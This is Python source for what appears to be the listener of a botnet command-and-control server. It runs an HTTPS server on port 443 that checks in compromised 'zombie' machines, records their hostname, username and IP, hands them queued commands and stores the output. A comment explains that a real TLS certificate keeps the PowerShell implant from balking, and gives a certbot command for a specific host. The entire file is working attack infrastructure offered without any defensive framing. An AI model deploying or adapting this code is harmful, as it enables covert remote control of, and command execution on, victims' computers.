import socket
import time
from zombie.Zombie import Zombie
import cgi
from http.server import BaseHTTPRequestHandler
import io
import json



# Array with zombies
global zombies
zombies = []



def process_zombie_checkin(json_object, public_ip):

	json_object = json_object.replace("\\","\\\\")
	data = json.loads(json_object)
	uuid = data['uuid']
	hostname = data['hostname']
	username = data['username']
	clm = data['clm']
	json_response = '{}'
	# If zombie is not registered, create it
	# else update check in time
	if not any(z.uuid == uuid for z in zombies):
		zombies.append(Zombie(uuid, hostname, username, public_ip, clm))
		json_response = '{"command":" "}'

	else:
		z = next((z for z in zombies if z.uuid == uuid), None)
		z.update_check_in_time()
		output_last_command = data['output_last_command']
		if not output_last_command == " ":
			z.set_output_last_command(output_last_command)
		if len(z.command_cue) > 0:
			command = z.command_cue.pop()
			json_response = '{"command":"'+command+'"}'
		else:
			json_response = '{"command":" "}'
	return json_response



class PostHandler(BaseHTTPRequestHandler):

	def do_POST(self):
		length = int(self.headers.get('content-length'))
		# Parse the form data posted
		json_object = self.rfile.read(length).decode()
		# print(json_object)
		# Get public IP
		public_ip = self.client_address[0]
		# JSON data given by the zombie
		json_response = process_zombie_checkin(json_object, public_ip)

		# Begin the response
		self.send_response(200)
		self.send_header('Content-Type',
				'text/plain; charset=utf-8')
		self.end_headers()
	
		out = io.TextIOWrapper(
			self.wfile,
			encoding='utf-8',
			line_buffering=False,
			write_through=True,
		)
	
		# Echo back information about what was posted in the form
		out.write(str(json_response))
	
		# Disconnect our encoding wrapper from the underlying
		# buffer so that deleting the wrapper doesn't close
		# the socket, which is still being used by the server.
		out.detach()

def start():
	from http.server import HTTPServer, BaseHTTPRequestHandler
	import ssl

	server = HTTPServer(('0.0.0.0', 443), PostHandler)
	# Use letsencrypt to generate legitimate cert. PS will flip otherwise.
	# Copy certs in same directory as liseter.py 
	# certbot certonly --manual -d 220.ip-54-37-16.eu -d 220.ip-54-37-16.eu --register-unsafely-without-email
	server.socket = ssl.wrap_socket (server.socket, 
	        keyfile="/opt/aldebaran/darma/key.pem", 
        	certfile='/opt/aldebaran/darma/cert.pem', server_side=True)

	server.serve_forever()

